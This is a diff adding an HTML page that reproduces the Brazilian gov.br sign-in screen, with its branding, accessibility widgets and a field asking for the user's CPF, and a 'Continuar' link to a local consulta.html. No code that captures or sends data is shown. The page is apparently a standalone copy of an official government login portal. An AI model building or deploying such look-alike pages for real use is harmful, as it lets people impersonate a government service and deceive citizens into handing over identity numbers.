@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar com gov.br</title>
+    <!-- 1. Importando o Bootstrap 5 -->
+    <link rel="icon" type="image/png" href="assets/favicon.png">
+    <!-- 2. Importando o Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- 3. Importando os Ícones do Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <!-- 4. Fonte Rawline (Padrão Gov.br) -->
+    <link rel="stylesheet" href="https://cdngovbr-ds.estaleiro.serpro.gov.br/design-system/fonts/rawline/css/rawline.css">
+    <!-- 5. Nosso CSS próprio -->
+    <link rel="stylesheet" href="css/style.css">
+    <script>
+        if (localStorage.getItem('alto-contraste') === 'true') {
+            document.documentElement.classList.add('alto-contraste');
+        }
+    </script>
+</head>
+<body class="bg-white">
+
+    <!-- Barra de Navegação Superior (Header) -->
+    <header class="bg-white py-3" style="box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);">
+        <div class="container-fluid px-3 d-flex justify-content-between align-items-center">
+
+            <!-- Logo gov.br -->
+            <a href="#" class="navbar-brand">
+                <img src="assets/mini-icone-gov.webp" alt="gov.br" height="32">
+            </a>
+
+            <!-- Atalhos de Acessibilidade (Alto contraste e Vlibras) -->
+            <div class="d-flex align-items-center gap-4">
+                <a href="#" id="btn-contraste" title="Alto Contraste" class="text-decoration-none text-dark small d-flex align-items-center gap-3">
+                    <i style="color: rgb(19, 81, 180);" class="fa-solid fa-circle-half-stroke"></i>
+                    <span class="fw-medium">Alto contraste</span>
+                </a>
+
+                <a href="#" id="btn-vlibras" title="VLibras" class="text-decoration-none text-dark small d-flex align-items-center gap-3">
+                    <i style="color: rgb(19, 81, 180);" class="fa-solid fa-ear-deaf"></i>
+                    <span class="fw-medium">Vlibras</span>
+                </a>
+            </div>
+
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="container my-5">
+        <div class="row justify-content-center align-items-start g-0">
+
+            <!-- Coluna da Imagem Institucional -->
+            <div class="col-12 col-lg-6 text-center">
+                <img src="assets/conta_govbr_v2_defeso-eleitoral.jpg"
+                     alt="Uma conta gov.br garante a identificação de cada cidadão"
+                     class="img-fluid shadow-sm">
+            </div>
+
+            <!-- Coluna do Card de Login -->
+            <div class="col-12 col-lg-4">
+                <div class="card border-1 shadow-sm p-4 bg-white rounded-0">
+
+                    <!-- Título do Card -->
+                    <h1 style="font-size: 1.125rem;" class="h5 fw-bold mb-4">Identifique-se no gov.br com:</h1>
+
+                    <!-- Identificação pelo CPF -->
+                    <div class="d-flex align-items-center gap-2 mb-1">
+                        <i style="color: rgb(19, 81, 180);" class="fa-solid fa-address-card fs-6"></i>
+                        <span class="fw-medium">Número do CPF</span>
+                    </div>
+
+                    <!-- Mensagem Informativa -->
+                    <p style="font-size: 0.790rem;" class="text-muted mb-3">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+
+                    <!-- Formulário de Entrada do CPF -->
+                    <form action="#" method="post">
+                        <div class="mb-3">
+                            <label for="cpf" style="font-size: 1em; color: rgb(51, 51, 51);" class="form-label fw-bold small text-muted">CPF</label>
+                            <input style="font-style: italic; font-size: 0.85rem; color: rgb(51, 51, 51);" type="text" id="cpf" class="form-control align-items-center border-dark-subtle" placeholder="Digite seu CPF" maxlength="14" required>
+                        </div>
+                        
+                        <!-- Botão de Ação -->
+                        <div class="d-flex justify-content-end mb-4">
+                            <a href="consulta.html" class="btn btn-primary rounded-pill px-4 fw-semibold shadow-sm" style="background-color: #1351B4; border-color: #1351B4;">
+                                Continuar
+                            </a>
+                        </div>
+                    </form>
+
+                    <!-- Seção de Outras Formas de Identificação -->
+                    <p class="fw-semibold mb-1">Outras opções de identificação:</p>
+                    <hr class="border-secondary border-1 opacity-75 my-1">
+
+                    <!-- Lista de Opções Alternativas de Login -->
+                    <div class="d-flex flex-column gap-3 small">
+                        <!-- Opção Banco (Conta Prata) -->
+                        <a href="#" class="d-flex align-items-center justify-content-between text-decoration-none text-dark p-2 hover-bg">
+                            <span class="d-flex align-items-center gap-3 text-success fw-semibold">
+                                <i class="fa-solid fa-building-columns fs-5"></i> Login com seu banco
+                            </span>
+                            <span style="background-color:green; color:white;" class="badge border rounded-0 px-2 py-1">SUA CONTA SERÁ PRATA</span>
+                        </a>
+                        
+                        <!-- Opção QR Code -->
+                        <a href="#" class="d-flex align-items-center gap-2 text-decoration-none text-dark p-2">
+                            <i style="color: #1351B4;" class="fa-solid fa-qrcode fs-5"></i> Login com QR code
+                        </a>
+
+                        <!-- Opção Certificado Digital -->
+                        <a href="#" class="d-flex align-items-center gap-2 text-decoration-none text-dark p-2">
+                            <i style="color: #1351B4;" class="fa-brands fa-usb fs-5"></i> Seu certificado digital
+                        </a>
+
+                        <!-- Opção Certificado em Nuvem -->
+                        <a href="#" class="d-flex align-items-center gap-2 text-decoration-none text-dark p-2">
+                            <i style="color: #1351B4;" class="fa-solid fa-cloud fs-5"></i> Seu certificado digital em nuvem
+                        </a>
+                    </div>
+
+                    <!-- Rodapé do Card (Links de Dúvidas e Termos) -->
+                    <div class="mt-4 pt-3 text-center small">
+                        <a href="#" class="d-flex align-items-center justify-content-center gap-2 text-decoration-none text-primary mb-2 fw-semibold">
+                            <i style="color: #1351B4;" class="fa-solid fa-circle-question fs-5"></i> Está com dúvidas e precisa de ajuda?
+                        </a>
+                        <a href="#" class="text-decoration-none text-primary fw-semibold">
+                            Termo de Uso de Aviso de Privacidade
+                        </a>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Controle de Alto Contraste & VLibras -->
+    <script src="js/contraste.js"></script>
+
+    <!-- Widget Oficial do VLibras -->
+    <div vw class="enabled">
+        <div vw-access-button class="active"></div>
+        <div vw-plugin-wrapper>
+            <div class="vw-plugin-top-wrapper"></div>
+        </div>
+    </div>
+    <script src="https://vlibras.gov.br/app/vlibras-plugin.js"></script>
+    <script>
+        new window.VLibras.Widget('https://vlibras.gov.br/app');
+    </script>
+</body>
+</html>
